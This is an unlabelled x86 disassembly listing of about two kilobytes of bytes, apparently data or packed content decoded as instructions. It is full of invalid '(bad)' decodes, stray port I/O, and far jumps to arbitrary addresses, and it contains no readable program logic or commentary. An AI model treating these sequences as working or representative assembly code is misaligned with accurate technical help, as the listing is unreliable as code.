  407865:	mov    ecx,0xb0eb044c
  40786a:	cmp    DWORD PTR [eax-0x21],ebx
  40786d:	dec    esp
  40786e:	adc    DWORD PTR [ebp-0x7f],ecx
  407871:	xchg   ecx,eax
  407872:	mov    ebp,0x2cf479e1
  407877:	inc    edi
  407878:	jo     0x407835
  40787a:	das    
  40787b:	pop    ss
  40787c:	mov    ds:0xe4690f11,eax
  407881:	and    al,0x79
  407883:	dec    ebx
  407884:	in     al,dx
  407885:	ins    BYTE PTR es:[edi],dx
  407886:	pop    ss
  407887:	ret    
  407888:	(bad)
  40788b:	nop
  40788c:	sbb    ch,BYTE PTR [edx-0x273247df]
  407892:	or     BYTE PTR [edi],ch
  407894:	cmp    dl,BYTE PTR [edi-0x3c]
  407897:	ret    
  407898:	mov    ecx,0xe463a5f6
  40789d:	scas   al,BYTE PTR es:[edi]
  40789e:	adc    esp,DWORD PTR [edx+0x636d0667]
  4078a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a5:	test   DWORD PTR [ebx+0x392d2736],esp
  4078ab:	js     0x4078e4
  4078ad:	lock shl BYTE PTR [edx+0x2e],1
  4078b1:	mov    ecx,0x5430726d
  4078b6:	das    
  4078b7:	pop    esp
  4078b8:	add    BYTE PTR [eax],ah
  4078ba:	aas    
  4078bb:	xchg   ebx,eax
  4078bc:	sbb    eax,0xb82153b0
  4078c1:	add    al,0xeb
  4078c3:	fisttp QWORD PTR [ecx]
  4078c5:	cmp    eax,0x44f4ba88
  4078ca:	xor    BYTE PTR [eax+0x4f],dl
  4078cd:	or     BYTE PTR [ecx+0x5d755133],bl
  4078d3:	jg     0x407919
  4078d5:	adc    al,0x2f
  4078d7:	retf   
  4078d8:	popf   
  4078d9:	daa    
  4078da:	xor    BYTE PTR [ebx+0x1cf4087],cl
  4078e0:	or     eax,0xf6cc88be
  4078e5:	fild   QWORD PTR [ebp+0xcb60f79]
  4078eb:	mov    ecx,0xc8a74cfc
  4078f0:	mov    ebp,0xbe0c5e53
  4078f5:	lock push cs
  4078f7:	hlt    
  4078f8:	(bad)  
  4078f9:	frstor [edx+0x26bb1b8e]
  4078ff:	mov    dl,0xd8
  407901:	inc    esp
  407902:	add    bh,BYTE PTR [edi]
  407904:	ss push edx
  407906:	fistp  DWORD PTR [ebp-0x32]
  407909:	mov    dl,0x86
  40790b:	xchg   ebx,eax
  40790c:	scas   al,BYTE PTR es:[edi]
  40790d:	inc    eax
  40790e:	fidiv  WORD PTR ds:0x8339d98f
  407914:	retf   0xc22b
  407917:	jg     0x407968
  407919:	aas    
  40791a:	mov    gs,WORD PTR [edi]
  40791c:	mov    WORD PTR [edx-0x49db5283],fs
  407922:	sub    esi,DWORD PTR [eax+0x7b14c332]
  407928:	cmp    ecx,ecx
  40792a:	mov    edx,0x5b2e801c
  40792f:	sbb    eax,0xd4e5c14a
  407934:	das    
  407935:	div    DWORD PTR [ebp-0x216275a8]
  40793b:	mov    edx,0x721f1e07
  407940:	inc    eax
  407941:	xor    al,BYTE PTR [ebp-0x11]
  407944:	sbb    eax,DWORD PTR [ebp+0x18]
  407947:	or     eax,0xa7b3a624
  40794c:	sbb    BYTE PTR [edi],cl
  40794e:	ja     0x407974
  407950:	repz aas 
  407952:	and    DWORD PTR [edx+0x53],eax
  407955:	mov    ds:0x59c8ec08,al
  40795a:	in     al,dx
  40795b:	push   0xd3e22423
  407960:	fwait
  407961:	cmp    eax,DWORD PTR [eax+0x38]
  407964:	sbb    ah,ch
  407966:	jo     0x4079c2
  407968:	popa   
  407969:	lods   al,BYTE PTR ds:[esi]
  40796a:	add    eax,DWORD PTR [ecx]
  40796c:	cmp    DWORD PTR [ebp+0x195226f0],ebp
  407972:	pop    eax
  407973:	fist   WORD PTR [eax+ebx*2]
  407976:	mov    dh,0xeb
  407978:	jne    0x407962
  40797a:	pmullw mm6,mm0
  40797d:	jge    0x407946
  40797f:	jae    0x4079cf
  407981:	jle    0x4079a9
  407983:	jne    0x40794d
  407985:	xchg   esi,eax
  407986:	pop    esp
  407987:	mov    ds:0xa3d53dad,al
  40798c:	mov    bl,0x37
  40798e:	cmp    cl,dl
  407990:	push   edi
  407991:	mov    bh,0x85
  407993:	or     bh,BYTE PTR [esi+0x51]
  407996:	mov    dh,0xa1
  407998:	nop
  407999:	or     BYTE PTR ds:0x1002e800,0xd9
  4079a0:	imul   esp,DWORD PTR [edx+0x1c],0x2b4f68c3
  4079a7:	push   ebp
  4079a8:	adc    al,0xe2
  4079aa:	call   0x6b29c43c
  4079af:	adc    BYTE PTR [ebx-0x69adfd61],bh
  4079b5:	sub    eax,0xb4996b89
  4079ba:	dec    edx
  4079bb:	adc    DWORD PTR [edi],ecx
  4079bd:	cmp    dl,BYTE PTR [esi-0x3b]
  4079c0:	aad    0xc1
  4079c2:	push   ss
  4079c3:	js     0x40798b
  4079c5:	jp     0x407a41
  4079c7:	inc    esp
  4079c8:	jp     0x4079d9
  4079ca:	xchg   DWORD PTR [eax-0x44],ebp
  4079cd:	imul   eax,DWORD PTR [esi+0x46],0xefcd7d10
  4079d4:	cmp    al,0xd2
  4079d6:	aaa    
  4079d7:	mov    dh,0x5f
  4079d9:	adc    DWORD PTR [edi-0x36],ebp
  4079dc:	dec    ebx
  4079dd:	fild   DWORD PTR [ecx-0x74]
  4079e0:	out    dx,eax
  4079e1:	sahf   
  4079e2:	imul   ebx,DWORD PTR ds:0x1ba69a52,0xffffffb3
  4079e9:	cmp    ebx,DWORD PTR [ebx-0x56]
  4079ec:	sub    eax,0x4a61328e
  4079f1:	jns    0x407a51
  4079f3:	into   
  4079f4:	cmp    al,0x3a
  4079f6:	cli    
  4079f7:	bound  edx,QWORD PTR [esi]
  4079f9:	add    BYTE PTR [ecx+0x27a05496],0x22
  407a00:	pop    ss
  407a01:	int    0xeb
  407a03:	mov    edx,0xe44752ed
  407a08:	ins    BYTE PTR es:[edi],dx
  407a09:	(bad)  
  407a0a:	sub    BYTE PTR [esi+edi*2-0x1a19e964],ah
  407a11:	push   esp
  407a12:	jo     0x407a21
  407a14:	pop    esp
  407a15:	sbb    BYTE PTR [edi],bl
  407a17:	mov    bh,0xbe
  407a19:	xlat   BYTE PTR ds:[ebx]
  407a1a:	shl    BYTE PTR [ebp-0x48289e24],cl
  407a20:	nop
  407a21:	ja     0x407a1f
  407a23:	(bad)
  407a27:	sbb    BYTE PTR [ecx+0x3e],0x18
  407a2b:	sbb    BYTE PTR [ebx],bl
  407a2d:	mov    dh,0x22
  407a2f:	jmp    0x5a3cd901
  407a34:	mov    dh,0xb6
  407a36:	ret    
  407a37:	push   ecx
  407a38:	lea    ecx,[eax-0x29]
  407a3b:	lahf   
  407a3c:	jmp    0x85743922
  407a41:	aam    0x17
  407a43:	out    dx,al
  407a44:	aam    0x9a
  407a46:	fisttp WORD PTR [ebp-0x76567fab]
  407a4c:	push   es
  407a4d:	pop    ecx
  407a4e:	xor    BYTE PTR [edi-0x4b],cl
  407a51:	jp     0x407a93
  407a53:	lea    esp,[esi+0x2b]
  407a56:	push   edx
  407a57:	repnz xchg ecx,eax
  407a59:	imul   esi,DWORD PTR [ebp-0x45625166],0x9f212129
  407a63:	cdq    
  407a64:	dec    eax
  407a65:	mov    al,0xd
  407a67:	ins    DWORD PTR es:[edi],dx
  407a68:	sahf   
  407a69:	test   DWORD PTR [edi],esp
  407a6b:	(bad)  
  407a6c:	shl    DWORD PTR ss:0xab16e282,0xaf
  407a74:	dec    ebx
  407a75:	add    eax,0x7e4fed
  407a7a:	pop    ebp
  407a7b:	mov    ss,ebp
  407a7d:	push   eax
  407a7e:	popa   
  407a7f:	or     edi,edi
  407a81:	adc    edi,DWORD PTR [edx-0x53]
  407a84:	aaa    
  407a85:	(bad)  
  407a87:	ret    
  407a88:	clc    
  407a89:	shr    DWORD PTR [ebx+0x49],0x25
  407a8d:	mov    BYTE PTR [edi+0x153af6a5],ch
  407a93:	xchg   ecx,edi
  407a95:	popa   
  407a96:	test   eax,0x5aab9787
  407a9b:	out    dx,eax
  407a9c:	jge    0x407a48
  407a9e:	outs   dx,DWORD PTR ds:[esi]
  407a9f:	rcr    DWORD PTR [edi-0x59],cl
  407aa2:	(bad)  
  407aa4:	lahf   
  407aa5:	adc    al,0x99
  407aa7:	ins    BYTE PTR es:[edi],dx
  407aa8:	stos   DWORD PTR es:[edi],eax
  407aa9:	or     edi,DWORD PTR [ecx-0x27ede287]
  407aaf:	pop    edi
  407ab0:	jne    0x407a48
  407ab2:	aas    
  407ab3:	mov    al,0x4a
  407ab5:	mov    cs,WORD PTR [esp+ecx*2-0x4eb8c9d6]
  407abc:	sub    ch,BYTE PTR [eax]
  407abe:	mov    ah,0x1b
  407ac0:	outs   dx,DWORD PTR ds:[esi]
  407ac1:	adc    bl,BYTE PTR [esi+0x453a23b1]
  407ac7:	cmc    
  407ac8:	ds (bad) 
  407aca:	int3   
  407acb:	sbb    BYTE PTR [eax+0x1f28c040],cl
  407ad1:	adc    ebp,DWORD PTR [ebx+0x45]
  407ad4:	sub    BYTE PTR [ecx+0x43a2033],bh
  407ada:	(bad)  
  407adb:	jb     0x407a5f
  407add:	fisubr DWORD PTR [esi-0x43]
  407ae0:	not    DWORD PTR [eax-0x29]
  407ae3:	mov    bh,0x97
  407ae5:	push   ebp
  407ae6:	mov    bh,0x2d
  407ae8:	dec    edx
  407ae9:	sub    bh,BYTE PTR [eax]
  407aeb:	sbb    al,0x98
  407aed:	xchg   esp,eax
  407aee:	jb     0x407b6a
  407af0:	test   DWORD PTR [ebx+ecx*4+0x51],ecx
  407af4:	cli    
  407af5:	push   es
  407af6:	dec    esi
  407af7:	sub    eax,0x8e077cad
  407afc:	fs xchg ecx,eax
  407afe:	repnz or eax,0x9acfbd48
  407b04:	(bad)  
  407b05:	jae    0x407a87
  407b07:	in     al,0x5c
  407b09:	adc    edi,DWORD PTR [edx]
  407b0b:	adc    al,0x95
  407b0d:	ror    BYTE PTR [edx+0x1],cl
  407b10:	jno    0x407ae3
  407b12:	inc    eax
  407b13:	ret    
  407b14:	xchg   esp,eax
  407b15:	les    esp,FWORD PTR [eax]
  407b17:	retf   
  407b18:	fnstenv [eax-0x5ea957a3]
  407b1e:	dec    si
  407b20:	aad    0xf6
  407b22:	xchg   DWORD PTR [ecx],esi
  407b24:	inc    ecx
  407b25:	pop    edi
  407b26:	or     ebp,DWORD PTR gs:[ecx-0xc]
  407b2a:	mov    al,0x3b
  407b2c:	dec    edi
  407b2d:	xor    al,0x4b
  407b2f:	adc    eax,0x39d05c80
  407b34:	cs ins BYTE PTR es:[edi],dx
  407b36:	test   BYTE PTR [esi],0xc0
  407b39:	lods   al,BYTE PTR ds:[esi]
  407b3a:	lock shr BYTE PTR [eax+ecx*1+0x742165e],cl
  407b42:	dec    edx
  407b43:	lods   al,BYTE PTR ds:[esi]
  407b44:	xchg   ebp,eax
  407b45:	push   0xfffffff1
  407b47:	ins    DWORD PTR es:[edi],dx
  407b48:	jae    0x407bb6
  407b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b4b:	repz xchg ebp,eax
  407b4d:	mov    cl,BYTE PTR [eax-0x72]
  407b50:	bnd jl 0x407b39
  407b53:	(bad)  [edx+ebx*2]
  407b56:	repz test DWORD PTR [ecx+0x7687482f],esi
  407b5d:	es cs inc ebp
  407b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b61:	lea    ebx,[esi+edx*1]
  407b64:	mov    ebx,0x4a3500c9
  407b69:	xchg   esi,eax
  407b6a:	inc    ecx
  407b6b:	shl    DWORD PTR [ecx-0x2f],0xdc
  407b6f:	test   eax,0x69d87aad
  407b74:	push   ecx
  407b75:	pop    edi
  407b76:	push   0x17
  407b78:	jg     0x407b20
  407b7a:	dec    esi
  407b7b:	leave  
  407b7c:	in     eax,dx
  407b7d:	dec    esp
  407b7e:	in     eax,dx
  407b7f:	idiv   BYTE PTR [edi+ebx*1]
  407b82:	mov    edx,0xbbb4662a
  407b87:	les    eax,FWORD PTR [ecx]
  407b89:	mov    dl,0xae
  407b8b:	mov    ah,0xad
  407b8d:	int    0x38
  407b8f:	xlat   BYTE PTR ds:[ebx]
  407b90:	jbe    0x407b27
  407b92:	mov    DWORD PTR [esi-0x2e],eax
  407b95:	xor    eax,0x80884a44
  407b9a:	shr    DWORD PTR [edx],0xe
  407b9d:	push   eax
  407b9e:	out    dx,al
  407b9f:	xor    al,0xf2
  407ba1:	sbb    al,0xc4
  407ba3:	aas    
  407ba4:	adc    ecx,DWORD PTR [eax]
  407ba6:	ror    BYTE PTR [ebx+0x31],cl
  407ba9:	mov    ah,0x13
  407bab:	das    
  407bac:	cmc    
  407bad:	mov    ah,0xbf
  407baf:	push   0x31
  407bb1:	int3   
  407bb2:	dec    esi
  407bb3:	gs cwde 
  407bb5:	mov    ds:0xc3833501,eax
  407bba:	clc    
  407bbb:	xlat   BYTE PTR ds:[ebx]
  407bbc:	dec    ecx
  407bbd:	jmp    0x38f9cd7e
  407bc2:	add    ch,dl
  407bc4:	mov    bl,0xfd
  407bc6:	jecxz  0x407bdb
  407bc8:	push   esi
  407bc9:	es mov edx,0x9eced6b6
  407bcf:	fsin   
  407bd1:	into   
  407bd2:	lea    ecx,[esi-0x38]
  407bd5:	jne    0x407b8f
  407bd7:	das    
  407bd8:	push   cs
  407bd9:	push   esi
  407bda:	call   0xe484:0xe197eb3d
  407be1:	push   ebx
  407be2:	dec    esi
  407be3:	cwde   
  407be4:	stos   BYTE PTR es:[edi],al
  407be5:	bound  esp,QWORD PTR [ebp+0x68]
  407be8:	retf   0x94c2
  407beb:	pop    ds
  407bec:	ret    
  407bed:	imul   ecx,ebx,0xffffffb1
  407bf0:	jno    0x407b9c
  407bf2:	icebp  
  407bf3:	and    BYTE PTR [edx],ch
  407bf5:	repz (bad) 
  407bf7:	mov    esi,0x6498d9f6
  407bfc:	bound  edi,QWORD PTR [edx+0x4b]
  407bff:	xchg   edx,eax
  407c00:	sub    al,0x63
  407c02:	cli    
  407c03:	ds mov dh,0x4c
  407c06:	push   ebx
  407c07:	dec    eax
  407c08:	je     0x407c4c
  407c0a:	je     0x407bc9
  407c0c:	pop    edx
  407c0d:	push   edx
  407c0e:	shl    BYTE PTR [ecx+esi*1-0x69],0x81
  407c13:	add    ebx,DWORD PTR [ebp-0x712c1f45]
  407c19:	mov    edi,0x7f67b794
  407c1e:	sar    BYTE PTR [ecx+0x16f2ca29],cl
  407c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c25:	test   DWORD PTR [ecx-0x34],ebx
  407c28:	add    dh,bl
  407c2a:	and    al,0xf0
  407c2c:	(bad)  
  407c2d:	stos   BYTE PTR es:[edi],al
  407c2e:	xor    cl,0xae
  407c31:	cmp    BYTE PTR [edi-0x5e],ah
  407c34:	arpl   dx,bp
  407c36:	popf   
  407c37:	shl    BYTE PTR ds:0xa075046,0xf6
  407c3e:	mov    ds:0x534387a1,al
  407c43:	fistp  QWORD PTR [ecx+ebx*4]
  407c46:	sbb    al,0xf7
  407c48:	and    cl,0x4
  407c4b:	shr    BYTE PTR [esi+0x36008fd],1
  407c51:	neg    DWORD PTR [esi]
  407c53:	sub    al,0x80
  407c55:	stos   BYTE PTR es:[edi],al
  407c56:	lods   eax,DWORD PTR ds:[esi]
  407c57:	sbb    DWORD PTR [ecx],esi
  407c59:	fisttp QWORD PTR [esi+edi*1-0x34]
  407c5d:	repz jmp 0xcff9324a
  407c63:	in     eax,0x56
  407c65:	or     eax,0xfd7b1c55
  407c6a:	xor    al,0xd5
  407c6c:	dec    ebx
  407c6d:	xor    al,0x2f
  407c6f:	and    esi,ebp
  407c71:	bound  edx,QWORD PTR [ecx+ebp*2-0x2b92da0]
  407c78:	(bad)  
  407c79:	xchg   edx,eax
  407c7a:	add    al,0x7f
  407c7d:	inc    ebx
  407c7e:	mov    ds:0x438c3d52,al
  407c83:	into   
  407c84:	push   ecx
  407c85:	jo     0x407cb1
  407c87:	mov    fs,WORD PTR [ebx+0x391d00a1]
  407c8d:	and    edx,DWORD PTR [ebx-0x39558d9c]
  407c93:	(bad)  
  407c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c95:	mov    dh,0x7c
  407c97:	loop   0x407d11
  407c99:	es push 0x72082d94
  407c9f:	popa   
  407ca0:	cs or  ecx,edi
  407ca3:	(bad)  
  407ca4:	mov    al,ds:0x203f3937
  407ca9:	add    bh,ah
  407cab:	scas   eax,DWORD PTR es:[edi]
  407cac:	out    dx,al
  407cad:	push   es
  407cae:	xor    eax,0x9ee1a1c5
  407cb3:	enter  0xc312,0xb9
  407cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb8:	das    
  407cb9:	mov    esp,eax
  407cbb:	jno    0x407d03
  407cbd:	pop    ebp
  407cbe:	add    bl,BYTE PTR ss:[ecx-0x48291680]
  407cc5:	test   DWORD PTR [edx-0x2bcbde81],ebx
  407ccb:	imul   esp,DWORD PTR [ecx],0x14
  407cce:	add    DWORD PTR [eax-0x475049ba],eax
  407cd4:	lahf   
  407cd5:	ja     0x407c63
  407cd7:	addr16 cdq 
  407cd9:	push   ds
  407cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cdb:	lock xor DWORD PTR [ecx+0x14],0xaefd28c5
  407ce3:	xchg   edx,eax
  407ce4:	cwde   
  407ce5:	pop    ss
  407ce6:	jae    0x407caf
  407ce8:	xlat   BYTE PTR ds:[ebx]
  407ce9:	add    BYTE PTR [esi],ch
  407ceb:	dec    esi
  407cec:	or     al,0x8e
  407cee:	jae    0x407cb1
  407cf0:	pop    esp
  407cf1:	xchg   DWORD PTR gs:[ebp-0x3109e862],edi
  407cf8:	mov    eax,0x5b733dca
  407cfd:	rcr    DWORD PTR [ebx-0x3f567d16],0x22
  407d04:	xchg   DWORD PTR [eax+0x13ab6460],esi
  407d0a:	and    dh,BYTE PTR [ebp+0x74ac5b86]
  407d10:	push   ebp
  407d11:	leave  
  407d12:	sbb    al,0x8d
  407d14:	sub    al,0x88
  407d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d17:	mov    cl,0x0
  407d19:	mov    ecx,0x86b0653f
  407d1e:	mov    al,ds:0x48e93480
  407d23:	adc    BYTE PTR [eax-0x2a],ch
  407d26:	icebp  
  407d27:	(bad)  
  407d28:	push   ebp
  407d29:	sbb    bh,BYTE PTR [eax]
  407d2b:	popf   
  407d2c:	ins    DWORD PTR es:[edi],dx
  407d2d:	lods   al,BYTE PTR ds:[esi]
  407d2e:	jb     0x407d2a
  407d30:	dec    edi
  407d31:	push   cs
  407d32:	loope  0x407cdf
  407d34:	outs   dx,BYTE PTR ds:[esi]
  407d35:	jge    0x407d50
  407d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d38:	sub    ebp,esp
  407d3a:	xchg   ecx,eax
  407d3b:	xlat   BYTE PTR ds:[ebx]
  407d3c:	adc    eax,0x5d038338
  407d41:	push   0xbcdc6488
  407d46:	push   eax
  407d47:	mov    eax,0x60ce0737
  407d4c:	or     al,0x84
  407d4e:	outs   dx,DWORD PTR ds:[esi]
  407d4f:	ret    
  407d50:	aad    0xa1
  407d52:	jmp    edi
  407d54:	inc    eax
  407d55:	gs ret 0x1096
  407d59:	fsubr  QWORD PTR [ebp-0x7fd03c2a]
  407d5f:	sar    DWORD PTR [eax+0x3f],0x7a
  407d63:	outs   dx,DWORD PTR ds:[esi]
  407d64:	fst    DWORD PTR [ebx-0x3d]
  407d67:	ret    
  407d68:	repz push ecx
  407d6a:	xchg   esi,eax
  407d6b:	xchg   edx,eax
  407d6c:	es mov ah,0x28
  407d6f:	scas   al,BYTE PTR es:[edi]
  407d70:	sbb    edi,DWORD PTR [esi+eiz*2-0x2bef1c4b]
  407d77:	push   cs
  407d78:	jae    0x407d8c
  407d7a:	add    BYTE PTR [edx+ebp*1+0x54],ch
  407d7e:	adc    ch,cl
  407d80:	mov    dh,0xba
  407d82:	xchg   esp,eax
  407d83:	pop    ebx
  407d84:	dec    esi
  407d85:	js     0x407d77
  407d87:	daa    
  407d88:	or     DWORD PTR [esi+ecx*2+0x47],eax
  407d8c:	jb     0x407d79
  407d8e:	push   0xe32ef883
  407d93:	loope  0x407db7
  407d95:	sub    DWORD PTR cs:[edx-0x232f3587],ecx
  407d9c:	jmp    0x407d45
  407d9e:	jge    0x407d54
  407da0:	loop   0x407dbe
  407da2:	mov    WORD PTR [esi+0x70],fs
  407da5:	in     al,dx
  407da6:	dec    edx
  407da7:	lds    ecx,FWORD PTR [edx+esi*1+0x3da543b6]
  407dae:	mov    edx,0x2fad427e
  407db3:	sub    eax,0x11a29343
  407db8:	mov    WORD PTR [ebx-0x7d],cs
  407dbb:	pushf  
  407dbc:	cs adc esi,edx
  407dbf:	xor    al,0xc2
  407dc1:	sahf   
  407dc2:	retf   
  407dc3:	sbb    eax,0xf3416b7c
  407dc8:	lods   eax,DWORD PTR ds:[esi]
  407dc9:	leave  
  407dca:	ret    
  407dcb:	scas   al,BYTE PTR es:[edi]
  407dcc:	xchg   al,ch
  407dce:	rcl    DWORD PTR [eax],0x1b
  407dd1:	add    DWORD PTR ss:[ebx-0x5abb029e],edi
  407dd8:	push   edi
  407dd9:	xor    dh,BYTE PTR [edi]
  407ddb:	or     esi,DWORD PTR [eax+ebx*2-0x76]
  407ddf:	pop    edx
  407de0:	pop    ebp
  407de1:	sub    ah,BYTE PTR [ecx+0x27]
  407de4:	inc    edi
  407de5:	cmp    BYTE PTR [ecx+ecx*8+0x25],dl
  407de9:	mov    ds:0x35c41a18,al
  407dee:	popf   
  407def:	lock (bad) 
  407df2:	mov    fs:0xeb922286,al
  407df8:	ds stc 
  407dfa:	shl    BYTE PTR [ebx+0x5b],1
  407dfd:	aad    0x20
  407dff:	retf   0x9a25
  407e02:	push   esi
  407e03:	jae    0x407dff
  407e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e06:	call   0x1b441e12
  407e0b:	adc    al,BYTE PTR [ebp+0x12]
  407e0e:	nop
  407e0f:	mov    DWORD PTR [ebp+0x56],ecx
  407e12:	or     dl,BYTE PTR [esi]
  407e14:	pop    edx
  407e15:	push   esi
  407e16:	mov    es,WORD PTR [ebp+edi*8+0x25]
  407e1a:	ret    
  407e1b:	ja     0x407e24
  407e1d:	adc    DWORD PTR [ebx+0x28],0xe09c2e54
  407e24:	arpl   bx,bx
  407e26:	ss jns 0x407e46
  407e29:	jnp    0x407e8a
  407e2b:	mov    edi,DWORD PTR [edi]
  407e2d:	ins    DWORD PTR es:[edi],dx
  407e2e:	int3   
  407e2f:	mov    ?,edi
  407e31:	xchg   esi,eax
  407e32:	inc    edi
  407e33:	inc    ebp
  407e34:	arpl   WORD PTR [esi+0x5b],bp
  407e37:	xlat   BYTE PTR ds:[ebx]
  407e38:	adc    esi,DWORD PTR [edi]
  407e3a:	shl    cl,1
  407e3c:	xchg   esp,eax
  407e3d:	jns    0x407dce
  407e3f:	inc    esp
  407e40:	pop    ebp
  407e41:	fld    DWORD PTR [esi]
  407e43:	mov    edi,0x15e3cb36
  407e48:	adc    eax,0xb2b0b86c
  407e4d:	cs cmp bh,bl
  407e50:	adc    BYTE PTR [edi-0x4e],cl
  407e53:	dec    ebx
  407e54:	or     dl,BYTE PTR [edi+0x53]
  407e57:	ret    
  407e58:	rol    edx,1
  407e5a:	sar    dl,cl
  407e5c:	mov    DWORD PTR [ebp+0x7c],esp
  407e5f:	dec    ebx
  407e60:	mov    dl,0x13
  407e62:	push   eax
  407e63:	push   ss
  407e64:	shr    DWORD PTR [ecx],1
  407e66:	mov    edx,0x764ec502
  407e6b:	jg     0x407e90
  407e6d:	cwde   
  407e6e:	fcmovnb st,st(0)
  407e70:	das    
  407e71:	cmp    al,0xb
  407e73:	stos   DWORD PTR es:[edi],eax
  407e74:	mov    ebx,0x616dd72c
  407e79:	adc    bl,BYTE PTR ds:0x4bff5a9e
  407e7f:	das    
  407e80:	pop    edi
  407e81:	not    BYTE PTR [esi]
  407e83:	jp     0x407e99
  407e85:	inc    esp
  407e86:	in     al,dx
  407e87:	mov    bl,0xd5
  407e89:	xor    eax,0x9c63e46d
  407e8f:	mov    ah,0x5f
  407e91:	and    ch,ch
  407e93:	adc    DWORD PTR [ebp+0xd27771b],ebx
  407e99:	jl     0x407ec2
  407e9b:	lods   al,BYTE PTR ds:[esi]
  407e9c:	xor    al,0x4d
  407e9e:	stos   BYTE PTR es:[edi],al
  407e9f:	add    eax,0xc590a85e
  407ea4:	jb     0x407e9c
  407ea6:	popf   
  407ea7:	sub    DWORD PTR [ebp-0x74],edx
  407eaa:	xlat   BYTE PTR ds:[ebx]
  407eab:	mov    WORD PTR [edx-0x2d],es
  407eae:	jmp    0xee44608a
  407eb3:	jecxz  0x407e82
  407eb5:	mov    DWORD PTR [eax-0x3c2a9dc0],ebx
  407ebb:	mov    DWORD PTR [edi],edx
  407ebd:	xor    eax,0x7ee5b954
  407ec2:	sub    al,0xe5
  407ec4:	sub    DWORD PTR [esi-0x5b],edi
  407ec7:	mov    dl,0x94
  407ec9:	and    DWORD PTR [esi-0x68],ebp
  407ecc:	sub    esi,DWORD PTR [edi+eax*4-0x7c5120b2]
  407ed3:	lahf   
  407ed4:	jle    0x407e9e
  407ed6:	fld    QWORD PTR [ecx+0x5f]
  407ed9:	inc    edx
  407eda:	jmp    0x407f15
  407edc:	xlat   BYTE PTR ds:[ebx]
  407edd:	imul   edi,DWORD PTR [ebp+0x4fde18ef],0x70
  407ee4:	call   0x66053729
  407ee9:	lock mov bl,0xa9
  407eec:	push   edx
  407eed:	test   DWORD PTR [edx-0x471bab35],edx
  407ef3:	jmp    0x2c08:0x15113ce
  407efa:	in     al,0x34
  407efc:	or     dl,ch
  407efe:	sbb    DWORD PTR [ebp+0x15],eax
  407f01:	setns  BYTE PTR [esp+ebx*1]
  407f05:	scas   al,BYTE PTR es:[edi]
  407f06:	cdq    
  407f07:	movd   DWORD PTR [ecx+0x1c6eecf],mm7
  407f0e:	(bad)  
  407f0f:	fmul   DWORD PTR [eax+eiz*2]
  407f12:	fcomp  DWORD PTR [ebx]
  407f14:	sbb    ah,BYTE PTR [ebx+0x76]
  407f17:	pop    edx
  407f18:	push   ebp
  407f19:	add    cl,ah
  407f1b:	sub    al,BYTE PTR es:[edx+ebx*8]
  407f1f:	jl     0x407f3f
  407f21:	dec    ebx
  407f22:	test   eax,0xbb58a151
  407f27:	cmc    
  407f28:	or     dl,BYTE PTR [edx-0x5f0277d4]
  407f2e:	xor    DWORD PTR [ebx],ebx
  407f30:	clc    
  407f31:	retf   
  407f32:	inc    esp
  407f33:	or     al,0x33
  407f35:	das    
  407f36:	fs retf 
  407f38:	mov    esp,0x32c80571
  407f3d:	inc    ecx
  407f3e:	push   esp
  407f3f:	and    DWORD PTR [ecx-0xcc968ba],esi
  407f45:	mov    al,dl
  407f47:	jne    0x407f3d
  407f49:	and    ch,al
  407f4b:	sbb    ebp,DWORD PTR [ebp-0x6e]
  407f4e:	jl     0x407fbd
  407f50:	out    0x32,al
  407f52:	ds popf 
  407f54:	add    ch,bl
  407f56:	xor    DWORD PTR [ecx+0x126414ab],0xa1908776
  407f60:	mov    ch,0x21
  407f62:	dec    edi
  407f63:	idiv   BYTE PTR [ecx-0x68d0f4d5]
  407f69:	mov    edi,0xcd65bb6a
  407f6e:	xor    esi,DWORD PTR [ebx+0xd]
  407f71:	ret    
  407f72:	or     al,0x95
  407f74:	push   esp
  407f75:	mov    al,0x31
  407f77:	add    al,0x7e
  407f79:	add    cl,bl
  407f7b:	mov    ebx,0x3477a59a
  407f80:	fsub   DWORD PTR [ebx]
  407f82:	or     al,0x88
  407f84:	iret   
  407f85:	out    dx,al
  407f86:	call   0x2807:0xb478ccb2
  407f8d:	outs   dx,BYTE PTR ds:[esi]
  407f8e:	push   esp
  407f8f:	and    al,0x9b
  407f91:	repz adc dl,BYTE PTR [ebx]
  407f94:	sbb    edi,esi
  407f96:	jns    0x407fc7
  407f98:	sub    BYTE PTR [eax+0x68],bh
  407f9b:	jmp    0x407f8c
  407f9d:	mov    esi,0xc4340517
  407fa2:	sbb    BYTE PTR [ebx-0x154c5cd5],dh
  407fa8:	imul   ebx,DWORD PTR [edi+esi*4+0x58],0x2feb5ab1
  407fb0:	and    bh,al
  407fb2:	fst    DWORD PTR [edi+0x723476e1]
  407fb8:	std    
  407fb9:	out    0xee,eax
  407fbb:	mov    DWORD PTR [esi-0x333b26f3],ebx
  407fc1:	aas    
  407fc2:	xlat   BYTE PTR ds:[ebx]
  407fc3:	sbb    DWORD PTR [esi],ebp
  407fc5:	(bad)  
  407fc6:	cmp    al,0x64
  407fc8:	pop    ebx
  407fc9:	es xchg esi,eax
  407fcb:	arpl   WORD PTR [ebp-0x49b49bfb],si
  407fd1:	and    ebx,esp
  407fd3:	sti    
  407fd4:	dec    edx
  407fd5:	cmp    BYTE PTR [esi+0x65fcf3db],0x4b
  407fdc:	mov    ah,0xe8
  407fde:	imul   eax,DWORD PTR [ebx+ecx*2-0x4028c2b3],0xd2bb4ff9
  407fe9:	(bad)  
  407fea:	retf   
  407feb:	fadd   DWORD PTR [eax+0x59dcdc1d]
  407ff1:	cmp    DWORD PTR [edx],ecx
  407ff3:	fdivr  st,st(4)
  407ff5:	cmp    eax,DWORD PTR [esi]
  407ff7:	out    0xd3,al
  407ff9:	mov    edx,0x9d0cbbde
  407ffe:	cmp    DWORD PTR [edx-0x198b236],0x77
  408005:	sub    eax,0x2c38fa39
  40800a:	nop
  40800b:	xchg   ebp,eax
  40800c:	popa   
  40800d:	mov    ?,WORD PTR ds:0xb88ab10c
